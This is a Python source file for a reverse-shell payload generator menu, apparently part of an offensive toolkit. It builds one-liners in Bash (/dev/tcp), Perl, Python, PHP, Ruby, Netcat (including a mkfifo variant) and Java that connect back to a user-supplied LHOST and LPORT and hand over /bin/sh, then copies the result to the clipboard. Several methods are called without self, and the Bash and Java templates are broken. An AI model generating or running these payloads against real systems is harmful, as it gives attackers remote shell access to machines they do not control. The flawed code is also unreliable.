#!/usr/bin/python3

from assets.banners import rsgen_banner
from assets.colors import *
from assets.designs import logo, author
from assets.prefixes import eagleshell_prefix, invalid_input_prefix
from assets.properties import clear_screen
from assets.shortcuts import Exit
from .exploitation import Exploitation
import os
import netifaces
import pyperclip


class RSGen:
    def __init__(self):
        self.payload()

    def header(self):
        os.system(clear_screen)
        print(logo)
        print(rsgen_banner)
        print(author)

    def payload(self):
        try:
            self.header()
            print('Payload:')
            print('\n\t1): Bash')
            print('\t2): Perl')
            print('\t3): Python')
            print('\t4): PHP')
            print('\t5): Ruby')
            print('\t6): Netcat')
            print('\t7): Java')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            while True:
                shell_select = input('\u001b[33mPAYLOAD \u001b[37m> ').lower()
                if shell_select == '1':
                    bash_shell()
                elif shell_select == '2':
                    perl_shell()
                elif shell_select == '3':
                    python_shell()
                elif shell_select == '4':
                    php_shell()
                elif shell_select == '5':
                    ruby_shell()
                elif shell_select == '6':
                    netcat_shell()
                elif shell_select == '7':
                    java_shell()
                elif shell_select == 'z':
                    Exploitation()
                elif shell_select == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()

    def configuration(self):
        try:
            self.header()
            print('Configuration:')
            self.ips()
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            self.lhost_set = input('\u001b[33mLHOST \u001b[37m> ').lower()
            if self.lhost_set == 'z':
                Exploitation()
            elif self.lhost_set == 'x':
                Exit()
        except KeyboardInterrupt:
            Exit()

    def ips(self):
        x = netifaces.interfaces()
        for i in x:
            if i != '':
                print('\n\tInterface: ' + i)
            try:
                ip = netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr']
                print('\tIP addr: {0} '.format(ip))
            except KeyError:
                continue

    def user_input(self):
        try:
            self.configuration()
            self.lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
            if self.lport_set == 'z':
                Exploitation()
            elif self.lport_set == 'x':
                Exit()
        except KeyboardInterrupt:
            Exit()

    def bash_shell(self):
        self.shell_set = 'Bash'
        user_input()
        self.result = system + ' >& /dev/tcp/' + self.lhost_set + '/' + self.lport_set + ' 0>&1'
        self.result2 = ''
        output()

    def perl_shell(self):
        self.shell_set = 'Perl'
        user_input()
        self.result = "perl -e 'use Socket;$i="'"' + self.lhost_set + '"'";$p=" + self.lport_set + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname("'"tcp"'"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"'">&S"'");open(STDOUT,"'">&S"'");open(STDERR,"'">&S"'");exec("'"/bin/sh -i"'");};'"
        self.result2 = ''
        output()

    def python_shell(self):
        self.shell_set = 'Python'
        user_input()
        self.result = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"' + self.lhost_set + '"'"," + self.lport_set + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["'"/bin/sh"'","'"-i"'"]);'"
        self.result2 = ''
        output()

    def php_shell(self):
        self.shell_set = 'PHP'
        user_input()
        self.result = "php -r '$sock=fsockopen("'"' + self.lhost_set + '"'',' + self.lport_set + ');exec("/bin/sh -i <&3 >&3 2>&3");'"'"
        self.result2 = ''
        output()

    def ruby_shell(self):
        self.shell_set = 'Ruby'
        user_input()
        self.result = "ruby -rsocket -e'f=TCPSocket.open("'"' + self.lhost_set + '"'',' + self.lport_set + ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"'"
        self.result2 = ''
        output()

    def netcat_shell(self):
        self.shell_set = 'Netcat'
        user_input()
        self.result = 'nc -e /bin/sh ' + self.lhost_set + ' ' + self.lport_set
        self.result2 = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + self.lhost_set + ' ' + self.lport_set + ' >/tmp/f'
        output()

    def java_shell(self):
        self.shell_set = 'Java'
        user_input()
        self.result = '''r = Runtime.getRuntime()
                p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/' + self.lhost_set + '/' + self.lport_set + ';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
                p.waitFor()'''
        self.result2 = ''
        output()

    def output(self):
        try:
            self.header()
            print('Output:')
            print('\n\tPAYLOAD: ' + self.shell_set)
            print('\tLHOST: ' + self.lhost_set)
            print('\tLPORT: ' + self.lport_set)
            print('\n\tOUTPUT: ' + self.result)
            if len(self.result2) > 1:
                print('\tOUTPUT: ' + self.result2)
            pyperclip.copy(self.result)
            print('\n\tY): New')
            print('\tZ): Menu')
            print('\tX): Exit\n')
            print(GREEN + '[+] Output Copied to Clipboard' + WHITE)
            while True:
                cmd = input(eagleshell_prefix).lower()
                if cmd == 'y':
                    RSGen()
                elif cmd == 'z':
                    Exploitation()
                elif cmd == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()
